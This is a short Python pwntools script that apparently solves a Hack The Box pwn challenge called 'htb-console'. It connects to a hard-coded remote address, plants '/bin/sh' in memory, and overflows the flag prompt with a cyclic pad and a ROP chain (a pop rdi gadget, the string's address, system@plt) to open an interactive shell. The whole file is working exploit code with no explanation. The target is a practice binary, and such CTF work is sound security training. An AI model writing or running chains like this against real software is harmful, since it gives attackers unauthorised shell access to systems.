#!/usr/bin/env python3


from pwn import *

BINARY = "./htb-console"
ADDR = "138.68.151.248"
PORT = 31730

splash()
elf = context.binary = ELF(BINARY)


class Gadgets:
    pop_rdi_ret = 0x401473


class Constants:
    bin_sh = 0x4040b0


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve() -> None:
    io = conn()

    io.sendlineafter(">> ", "hof")
    payload = [
        b"/bin/sh\x00"
    ]
    io.sendlineafter("Enter your name: ", flat(payload))

    io.sendlineafter(">> ", "flag")
    payload = [
        cyclic(cyclic_find(0x6161616161616164, n=8), n=8),
        Gadgets.pop_rdi_ret,
        Constants.bin_sh,
        elf.plt.system,
    ]
    io.sendlineafter("Enter flag: ", flat(payload))

    io.interactive()


if __name__ == "__main__":
    solve()
